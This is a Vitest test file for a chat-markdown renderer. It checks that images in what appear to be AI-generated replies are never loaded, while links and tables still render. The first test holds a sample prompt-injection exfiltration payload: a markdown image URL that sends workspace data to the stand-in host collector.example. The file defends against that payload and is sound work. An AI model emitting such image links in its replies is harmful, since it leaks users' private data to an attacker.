// @vitest-environment jsdom

import { cleanup, render } from '@testing-library/react';
import { afterEach, describe, expect, test } from 'vitest';
import { ChatMarkdown } from './chat-markdown';

describe('ChatMarkdown', () => {
  afterEach(cleanup);

  test('never loads an image from a reply', () => {
    // What a steered reply could look like: workspace data in an image URL.
    const { container } = render(
      <ChatMarkdown text="Here you go ![chart](https://collector.example/p.png?d=revenue-123)" />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('collector.example');
    expect(container.textContent).toContain('[Image not shown: chart]');
  });

  test('still renders links, tables and text', () => {
    const { container, getByRole } = render(
      <ChatMarkdown
        text={
          'See [the docs](https://docs.flarepanel.dev/).\n\n| Page | Views |\n|---|---|\n| / | 12 |'
        }
      />
    );
    const link = getByRole('link', { name: 'the docs' });
    expect(link.getAttribute('href')).toBe('https://docs.flarepanel.dev/');
    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    expect(container.querySelector('table')).not.toBeNull();
  });
});
